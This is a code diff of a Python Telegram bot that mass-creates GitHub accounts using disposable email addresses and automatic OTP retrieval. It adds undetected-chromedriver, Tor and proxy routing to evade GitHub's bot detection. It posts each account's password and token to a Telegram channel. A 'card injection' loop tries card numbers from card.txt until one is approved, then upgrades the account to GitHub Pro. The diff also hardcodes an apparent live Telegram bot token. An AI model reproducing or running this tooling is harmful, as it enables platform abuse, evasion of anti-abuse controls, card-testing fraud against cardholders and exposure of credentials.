@@ -6,25 +6,103 @@ import re
 import os
 import hashlib
 import json
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
+import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait, Select
 from selenium.webdriver.support import expected_conditions as EC
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from TempMail import TempMail
-#from temp_mail import TempMail
-BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-CHROMEDRIVER_PATH = "/usr/local/bin/chromedriver"
-PASSWORD = "YourDefaultPassword@123"
+
+# Force IPv4 — Kali Linux tries IPv6 first which is unreachable, causing timeouts in Python
+import socket
+_orig_getaddrinfo = socket.getaddrinfo
+def _getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
+    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
+socket.getaddrinfo = _getaddrinfo_ipv4
+
+# TempMail library is optional — import safely
+try:
+    from TempMail import TempMail as _TempMailLib
+    TEMPMAIL_LIB_AVAILABLE = True
+except ImportError:
+    try:
+        from temp_mail import TempMail as _TempMailLib
+        TEMPMAIL_LIB_AVAILABLE = True
+    except ImportError:
+        TEMPMAIL_LIB_AVAILABLE = False
+        _TempMailLib = None
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8969796139:AAE6MQSEyxWVTMapdKsKrjopNUcm3SYoaKM")
+PASSWORD = "Benrooodd354354"
+TOR_PROXY = "socks5://127.0.0.1:9050"  # Tor SOCKS5 proxy
+
+# Proxy untuk Chromium — bisa di-override via env variable CHROME_PROXY
+# Contoh: export CHROME_PROXY=socks5://127.0.0.1:9050
+#          export CHROME_PROXY=http://user:pass@proxy.example.com:8080
+CHROME_PROXY = os.environ.get("CHROME_PROXY", "")  # kosong = tidak pakai proxy
+
+# Proxy untuk Telegram API — bisa di-override via env variable TG_PROXY
+TG_PROXY = os.environ.get("TG_PROXY", "")  # kosong = tidak pakai proxy
+
+# Auto-detect Chrome/Chromium binary path
+import shutil
+def _find_chrome_binary():
+    for candidate in ["google-chrome", "google-chrome-stable", "chromium", "chromium-browser"]:
+        path = shutil.which(candidate)
+        if path:
+            return path
+    for path in ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]:
+        if os.path.exists(path):
+            return path
+    return None
+
+# Auto-detect writable ChromeDriver path (undetected-chromedriver needs write access)
+def _find_chromedriver():
+    # Docker: we pre-copy to /usr/local/bin/chromedriver-uc
+    if os.path.exists("/usr/local/bin/chromedriver-uc"):
+        return "/usr/local/bin/chromedriver-uc"
+    # Kali local: copy in project dir
+    local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chromedriver")
+    if os.path.exists(local):
+        return local
+    # Fallback system path (may fail if not writable)
+    return "/usr/bin/chromedriver"
+
+CHROMEDRIVER_PATH = _find_chromedriver()
+CHROME_BINARY = _find_chrome_binary()
+
+if CHROME_BINARY:
+    print(f"✅ Found browser binary: {CHROME_BINARY}")
+else:
+    print("❌ WARNING: No Chrome/Chromium binary found! Install with: sudo apt install -y chromium")
+print(f"✅ ChromeDriver path: {CHROMEDRIVER_PATH}")
+
+# Increase connect & read timeout so slow/proxied connections don't crash the bot
+telebot.apihelper.CONNECT_TIMEOUT = 60
+telebot.apihelper.READ_TIMEOUT = 60
+# Route Telegram API calls through proxy if configured
+if TG_PROXY:
+    telebot.apihelper.proxy = {"https": TG_PROXY}
+    print(f"🔀 Telegram using proxy: {TG_PROXY}")
+
 bot = telebot.TeleBot(BOT_TOKEN)
+
+def safe_send(chat_id, text, **kwargs):
+    """Send a Telegram message with automatic retry on timeout."""
+    for attempt in range(3):
+        try:
+            return bot.send_message(chat_id, text, **kwargs)
+        except Exception as e:
+            if attempt < 2:
+                print(f"[safe_send] Attempt {attempt+1} failed: {e} — retrying in 5s...")
+                time.sleep(5)
+            else:
+                print(f"[safe_send] All retries failed for chat_id={chat_id}: {e}")
 user_sessions = {}
 user_accounts = {} 
-ADMIN_IDS = [YOUR_TELEGRAM_USER_ID]
+ADMIN_IDS = [5845350869]
 APPROVE_FILE = "approve.txt"
 ACCOUNTS_FILE = "accounts.json"
-CHANNEL_ID = YOUR_CHANNEL_ID  # Channel where accounts are posted
+CHANNEL_ID = -1004451745585  # Channel where accounts are posted
 approved_users = set()
 
 # Load approved users
@@ -63,7 +141,9 @@ def random_suffix(length=6):
 
 class TempMailService:
     def __init__(self):
-        self.tmp = TempMail()
+        if not TEMPMAIL_LIB_AVAILABLE:
+            raise ImportError("TempMail library is not installed")
+        self.tmp = _TempMailLib()
         self.inbox = None
         self.email = None
 
@@ -374,20 +454,20 @@ def create_multiple_accounts(chat_id, amount):
     failed_count = 0
 
     for i in range(amount):
-        bot.send_message(chat_id, f"🔄 Creating account {i+1}/{amount}...")
+        safe_send(chat_id, f"🔄 Creating account {i+1}/{amount}...")
 
         result = github_signup_auto(chat_id, account_number=i+1)
 
         if result:
             success_count += 1
-            bot.send_message(chat_id, f"✅ Account {i+1}/{amount} created successfully!")
+            safe_send(chat_id, f"✅ Account {i+1}/{amount} created successfully!")
         else:
             failed_count += 1
-            bot.send_message(chat_id, f"❌ Account {i+1}/{amount} failed to create.")
+            safe_send(chat_id, f"❌ Account {i+1}/{amount} failed to create.")
 
         # Wait between accounts to avoid rate limiting
         if i < amount - 1:
-            bot.send_message(chat_id, "⏳ Waiting 10 seconds before creating next account...")
+            safe_send(chat_id, "⏳ Waiting 10 seconds before creating next account...")
             time.sleep(10)
 
     # Final summary
@@ -397,7 +477,7 @@ def create_multiple_accounts(chat_id, amount):
     summary += f"📊 Total: {amount}\n\n"
     summary += f"Use `/accounts` to view all your accounts."
 
-    bot.send_message(chat_id, summary, parse_mode="Markdown")
+    safe_send(chat_id, summary, parse_mode="Markdown")
 
 def create_repo_and_codespace(driver, wait, username):
     try:
@@ -433,16 +513,16 @@ def upgrade_to_github_pro(driver, chat_id=None):
         driver.get("https://github.com/settings/billing/licensing")
 
         if chat_id:
-            bot.send_message(chat_id, "🔁 Opening Licensing Page...")
+            safe_send(chat_id, "🔁 Opening Licensing Page...")
 
         try:
             upgrade_link = wait.until(EC.element_to_be_clickable((By.XPATH, "//a[contains(., 'Upgrade to GitHub Pro')]")))
             upgrade_link.click()
             if chat_id:
-                bot.send_message(chat_id, "✅ Clicked 'Upgrade to GitHub Pro' link.")
+                safe_send(chat_id, "✅ Clicked 'Upgrade to GitHub Pro' link.")
         except Exception as link_error:
             if chat_id:
-                bot.send_message(chat_id, f"⚠️ Could not find upgrade link: {link_error}")
+                safe_send(chat_id, f"⚠️ Could not find upgrade link: {link_error}")
             return False
 
         try:
@@ -450,10 +530,10 @@ def upgrade_to_github_pro(driver, chat_id=None):
             time.sleep(2)
             final_button.click()
             if chat_id:
-                bot.send_message(chat_id, "✅ Clicked final 'Upgrade to GitHub Pro' button.")
+                safe_send(chat_id, "✅ Clicked final 'Upgrade to GitHub Pro' button.")
         except Exception as button_error:
             if chat_id:
-                bot.send_message(chat_id, f"⚠️ Failed - Card not added or insufficient balance")
+                safe_send(chat_id, f"⚠️ Failed - Card not added or insufficient balance")
             return False
 
         time.sleep(5)
@@ -462,7 +542,7 @@ def upgrade_to_github_pro(driver, chat_id=None):
         return True
     except Exception as e:
         if chat_id:
-            bot.send_message(chat_id, f"❌ Error during upgrade: {e}")
+            safe_send(chat_id, f"❌ Error during upgrade: {e}")
         return False
 
 def github_signup_auto(chat_id, account_number=1):
@@ -475,36 +555,74 @@ def github_signup_auto(chat_id, account_number=1):
     temp_mail = create_temp_email_with_fallback()
 
     if not temp_mail or not temp_mail.email:
-        bot.send_message(chat_id, f"❌ Account {account_number}: Failed to create temporary email")
+        safe_send(chat_id, f"❌ Account {account_number}: Failed to create temporary email")
         return False
 
     email = temp_mail.email
 
     # Check if it's from TempMail library
     if isinstance(temp_mail, TempMailService):
-        bot.send_message(chat_id, f"📧 Account {account_number}: Created temporary email: `{email}`", parse_mode="Markdown")
+        safe_send(chat_id, f"📧 Account {account_number}: Created temporary email: `{email}`", parse_mode="Markdown")
     else:
-        bot.send_message(chat_id, f"⚠️ Account {account_number}: Using backup email: `{email}`", parse_mode="Markdown")
+        safe_send(chat_id, f"⚠️ Account {account_number}: Using backup email: `{email}`", parse_mode="Markdown")
 
     try:
         ios_user_agent = random.choice(IOS_USER_AGENTS)
-        service = Service(CHROMEDRIVER_PATH)
-        options = webdriver.ChromeOptions()
-        options.add_argument('--headless=new')
+
+        # Use undetected-chromedriver + optional proxy to bypass GitHub bot detection
+        options = uc.ChromeOptions()
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
         options.add_argument('--disable-gpu')
-        options.add_argument('--log-level=3')
+        options.add_argument('--disable-software-rasterizer')
         options.add_argument('--window-size=1920,1080')
-        options.add_argument('--incognito')
-        options.add_argument(f"user-agent={ios_user_agent}")
-        options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        options.add_argument(f'--user-agent={ios_user_agent}')
+        if CHROME_PROXY:
+            options.add_argument(f'--proxy-server={CHROME_PROXY}')
+            print(f"[Selenium] Using proxy: {CHROME_PROXY}")
+            options.add_argument('--disable-webrtc')
+            options.add_experimental_option('prefs', {
+                'webrtc.ip_handling_policy': 'disable_non_proxied_udp',
+                'webrtc.multiple_routes_enabled': False,
+                'webrtc.nonproxied_udp_enabled': False,
+            })
 
-        driver = webdriver.Chrome(service=service, options=options)
+        # Try launching driver, fallback without headless if new one crashes
+        driver = None
+        try:
+            driver = uc.Chrome(
+                driver_executable_path=CHROMEDRIVER_PATH,
+                browser_executable_path=CHROME_BINARY,
+                options=options,
+                headless=True,
+                version_main=150,
+            )
+        except Exception as e1:
+            print(f"[Selenium] headless failed: {e1}")
+            print("[Selenium] Retrying without headless...")
+            options2 = uc.ChromeOptions()
+            options2.add_argument('--no-sandbox')
+            options2.add_argument('--disable-dev-shm-usage')
+            options2.add_argument('--disable-gpu')
+            options2.add_argument('--window-size=1920,1080')
+            options2.add_argument(f'--user-agent={ios_user_agent}')
+            options2.add_argument(f'--proxy-server={TOR_PROXY}')
+            options2.add_argument('--disable-webrtc')
+            try:
+                driver = uc.Chrome(
+                    driver_executable_path=CHROMEDRIVER_PATH,
+                    browser_executable_path=CHROME_BINARY,
+                    options=options2,
+                    headless=False,
+                    version_main=150,
+                )
+            except Exception as e2:
+                print(f"[Selenium] Retry also failed: {e2}")
+                raise e2
         wait = WebDriverWait(driver, 30)
 
         driver.get("https://github.com/signup")
-        bot.send_message(chat_id, f"🟢 Account {account_number}: Start Creating GitHub Account...")
+        safe_send(chat_id, f"🟢 Account {account_number}: Start Creating GitHub Account...")
 
         # Enter email
         email_input = wait.until(EC.presence_of_element_located((By.ID, "email")))
@@ -535,18 +653,18 @@ def github_signup_auto(chat_id, account_number=1):
             time.sleep(1)
 
         if "account_verifications" in driver.current_url:
-            bot.send_message(chat_id, f"📨 Account {account_number}: Waiting for OTP from email...")
+            safe_send(chat_id, f"📨 Account {account_number}: Waiting for OTP from email...")
 
             # Only try to get OTP if using TempMail library
             if isinstance(temp_mail, TempMailService) or isinstance(temp_mail, OneSecMailService) or isinstance(temp_mail, TempMailPlusService):
                 otp = temp_mail.get_otp_from_github_email()
 
                 if not otp:
-                    bot.send_message(chat_id, f"❌ Account {account_number}: Failed to receive OTP from email")
+                    safe_send(chat_id, f"❌ Account {account_number}: Failed to receive OTP from email")
                     driver.quit()
                     return False
 
-                bot.send_message(chat_id, f"✅ Account {account_number}: Received OTP: `{otp}`", parse_mode="Markdown")
+                safe_send(chat_id, f"✅ Account {account_number}: Received OTP: `{otp}`", parse_mode="Markdown")
 
                 # Enter OTP (handle both 6 and 8 digit OTPs)
                 otp_length = len(otp)
@@ -563,7 +681,7 @@ def github_signup_auto(chat_id, account_number=1):
                         driver.execute_script("arguments[0].click();", btn)
                         break
             else:
-                bot.send_message(chat_id, f"⚠️ Account {account_number}: Using backup email - OTP verification not available.")
+                safe_send(chat_id, f"⚠️ Account {account_number}: Using backup email - OTP verification not available.")
                 driver.quit()
                 return False
 
@@ -577,7 +695,7 @@ def github_signup_auto(chat_id, account_number=1):
             time.sleep(3)
 
             if "sessions/verified-device" in driver.current_url:
-                bot.send_message(chat_id, f"🛡 Account {account_number}: Device verification required. Handling automatically...")
+                safe_send(chat_id, f"🛡 Account {account_number}: Device verification required. Handling automatically...")
                 time.sleep(5)
 
             # Create repository and codespace
@@ -630,13 +748,13 @@ def github_signup_auto(chat_id, account_number=1):
             tg_user = bot.get_chat(chat_id)
             gh_info = f"👤 GitHub Username: `{USERNAME}`\n🔐 Password: `{PASSWORD}`\n🪪 Token: `{token}`\n📧 Email: `{email}`"
             tg_info = f"👤 TG User: {tg_user.first_name} (@{tg_user.username})\n🆔 ID: `{chat_id}`\n📊 Account #{account_number}"
-            bot.send_message(CHANNEL_ID, f"{tg_info}\n\n{gh_info}", parse_mode="Markdown")
+            safe_send(CHANNEL_ID, f"{tg_info}\n\n{gh_info}", parse_mode="Markdown")
 
             # Handle billing and card injection
             try:
                 billing_url = "https://github.com/settings/billing/payment_information"
                 driver.get(billing_url)
-                bot.send_message(chat_id, f"💳 Account {account_number}: Opening Billing Information Page...")
+                safe_send(chat_id, f"💳 Account {account_number}: Opening Billing Information Page...")
 
                 wait.until(EC.presence_of_element_located((By.ID, "account_screening_profile_first_name"))).send_keys("soul")
                 driver.find_element(By.ID, "account_screening_profile_last_name").send_keys("king")
@@ -647,7 +765,7 @@ def github_signup_auto(chat_id, account_number=1):
 
 
                 wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@name='submit' and contains(., 'Save billing information')]"))).click()
-                bot.send_message(chat_id, f"💾 Account {account_number}: Saved Billing Information.")
+                safe_send(chat_id, f"💾 Account {account_number}: Saved Billing Information.")
                 time.sleep(3)
 
                 driver.refresh()
@@ -656,12 +774,12 @@ def github_signup_auto(chat_id, account_number=1):
                 try:
                     warning_banner = driver.find_element(By.CSS_SELECTOR, '[data-testid="trade-screening-status-banner"]')
                     if "flagged" in warning_banner.text.lower():
-                        bot.send_message(chat_id, f"🚫 Account {account_number}: Account is FLAGGED. Cannot proceed with billing.")
+                        safe_send(chat_id, f"🚫 Account {account_number}: Account is FLAGGED. Cannot proceed with billing.")
                         driver.quit()
                         return True  # Still consider it successful since account was created
 
                 except:
-                    bot.send_message(chat_id, f"✅ Account {account_number}: No flagged warning detected.")
+                    safe_send(chat_id, f"✅ Account {account_number}: No flagged warning detected.")
 
                 # Card injection logic
                 if os.path.exists("card.txt"):
@@ -670,7 +788,7 @@ def github_signup_auto(chat_id, account_number=1):
 
                     for card_line in card_list:
                         driver.get(billing_url)
-                        bot.send_message(chat_id, f"💳 Account {account_number}: Trying card: `{card_line[:4]}****`", parse_mode="Markdown")
+                        safe_send(chat_id, f"💳 Account {account_number}: Trying card: `{card_line[:4]}****`", parse_mode="Markdown")
                         try:
                             add_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.js-edit-payment-method-btn")))
                             add_btn.click()
@@ -684,43 +802,43 @@ def github_signup_auto(chat_id, account_number=1):
                             wait.until(EC.presence_of_element_located((By.ID, "input-cardSecurityCode"))).send_keys(cvv)
 
                             wait.until(EC.element_to_be_clickable((By.ID, "submitButton"))).click()
-                            bot.send_message(chat_id, f"💾 Account {account_number}: Submitted card. Waiting for confirmation...")
+                            safe_send(chat_id, f"💾 Account {account_number}: Submitted card. Waiting for confirmation...")
                             time.sleep(5)
 
                             try:
                                 error_div = driver.find_element(By.ID, "error")
                                 if "declined" in error_div.text.lower():
-                                    bot.send_message(chat_id, f"❌ Account {account_number}: Card Declined")
+                                    safe_send(chat_id, f"❌ Account {account_number}: Card Declined")
                                     driver.switch_to.default_content()
                                     continue
                             except:
-                                bot.send_message(chat_id, f"✅ Account {account_number}: Card approved.")
+                                safe_send(chat_id, f"✅ Account {account_number}: Card approved.")
                                 driver.switch_to.default_content()
                                 upgrade_result = upgrade_to_github_pro(driver, chat_id)
                                 if upgrade_result:
-                                    bot.send_message(chat_id, f"🎉 Account {account_number}: GitHub Pro Upgrade Successful!")
+                                    safe_send(chat_id, f"🎉 Account {account_number}: GitHub Pro Upgrade Successful!")
                                 else:
-                                    bot.send_message(chat_id, f"⚠️ Account {account_number}: Card submitted, but upgrade to GitHub Pro failed.")
+                                    safe_send(chat_id, f"⚠️ Account {account_number}: Card submitted, but upgrade to GitHub Pro failed.")
                                 break
 
                             driver.switch_to.default_content()
                             driver.refresh()
                             time.sleep(5)
                         except Exception as card_error:
-                            bot.send_message(chat_id, f"⚠️ Account {account_number}: Card error")
+                            safe_send(chat_id, f"⚠️ Account {account_number}: Card error")
                             driver.switch_to.default_content()
                             continue
                 else:
-                    bot.send_message(chat_id, f"⚠️ Account {account_number}: No card.txt file found. Skipping card injection.")
+                    safe_send(chat_id, f"⚠️ Account {account_number}: No card.txt file found. Skipping card injection.")
 
             except Exception as e:
-                bot.send_message(chat_id, f"❌ Account {account_number}: Billing/Card error: {e}")
+                safe_send(chat_id, f"❌ Account {account_number}: Billing/Card error: {e}")
 
             # Try to upgrade to GitHub Pro even without card
             try:
                 upgrade_result = upgrade_to_github_pro(driver, chat_id)
                 if upgrade_result:
-                    bot.send_message(chat_id, f"🎉 Account {account_number}: GitHub Pro Upgrade Successful!")
+                    safe_send(chat_id, f"🎉 Account {account_number}: GitHub Pro Upgrade Successful!")
             except:
                 pass
 
@@ -728,12 +846,12 @@ def github_signup_auto(chat_id, account_number=1):
             return True
 
         else:
-            bot.send_message(chat_id, f"❌ Account {account_number}: Account creation failed - no verification page found")
+            safe_send(chat_id, f"❌ Account {account_number}: Account creation failed - no verification page found")
             driver.quit()
             return False
 
     except Exception as e:
-        bot.send_message(chat_id, f"❌ Account {account_number}: Error during GitHub signup: {str(e)}")
+        safe_send(chat_id, f"❌ Account {account_number}: Error during GitHub signup: {str(e)}")
         try:
             driver.quit()
         except:
@@ -949,7 +1067,9 @@ if __name__ == "__main__":
 
     while True:
         try:
-            bot.polling(non_stop=True, timeout=30)
+            print("🔄 Starting bot polling...")
+            bot.polling(non_stop=True, timeout=60, long_polling_timeout=60)
         except Exception as e:
             print(f"❌ Bot crashed with error: {e}")
-            time.sleep(5)  # wait 5 seconds before restarting
+            print("🔁 Restarting in 10 seconds...")
+            time.sleep(10)
